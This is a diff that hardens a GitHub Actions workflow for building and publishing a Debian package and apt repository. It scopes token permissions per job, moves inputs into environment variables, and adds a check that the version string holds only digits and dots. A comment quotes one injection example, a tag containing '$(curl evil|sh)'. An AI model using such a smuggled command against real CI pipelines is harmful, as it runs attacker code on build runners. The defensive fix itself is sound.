@@ -11,32 +11,42 @@ on:
     tags:
       - "v*"
 
-permissions:
-  contents: write
-
 jobs:
   build:
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-node@v4
         with: { node-version: 20 }
       - name: version
         id: v
+        env:
+          WANT: ${{ inputs.version }}
         run: |
-          if [ "${{ inputs.version }}" != "" ]; then
-            echo "version=${{ inputs.version }}" >> $GITHUB_OUTPUT
+          if [ -n "$WANT" ]; then
+            raw="$WANT"
           elif [[ "$GITHUB_REF" == refs/tags/v* ]]; then
-            echo "version=${GITHUB_REF#refs/tags/v}" >> $GITHUB_OUTPUT
+            raw="${GITHUB_REF#refs/tags/v}"
           else
-            echo "version=$(node -p "require('./package.json').version")" >> $GITHUB_OUTPUT
+            raw=$(node -p "require('./package.json').version")
           fi
+          # tag names allow $( ) ` ; - without this check a pushed tag like
+          # v0.1.4$(curl evil|sh) would execute on this runner when the
+          # version string is interpolated downstream
+          case "$raw" in
+            *[!0-9.]*) echo "invalid version: $raw" >&2; exit 1;;
+          esac
+          echo "version=$raw" >> $GITHUB_OUTPUT
           cat $GITHUB_OUTPUT
       - run: npm install --no-audit --no-fund
       - run: npm run build
       - run: node dist/harness/cli.js --version
       - run: node dist/harness/cli.js doctor
-      - run: bash scripts/build-deb.sh ${{ steps.v.outputs.version }}
+      - run: bash scripts/build-deb.sh "$VERSION"
+        env:
+          VERSION: ${{ steps.v.outputs.version }}
       - run: ls -lh dist-deb/
       - name: upload to release
         if: github.event_name == 'release'
@@ -53,6 +63,8 @@ jobs:
     needs: build
     if: github.event_name == 'release'
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
     steps:
       - uses: actions/checkout@v4
         with:
@@ -90,5 +102,5 @@ jobs:
           echo "Date: $(date -Ru)" >> dists/stable/Release
           cd /tmp/pages
           git add apt/
-          git commit -m "apt repo for ${{ github.ref_name }}" || echo "nothing to commit"
+          git commit -m "apt repo for $GITHUB_REF_NAME" || echo "nothing to commit"
           git push origin gh-pages
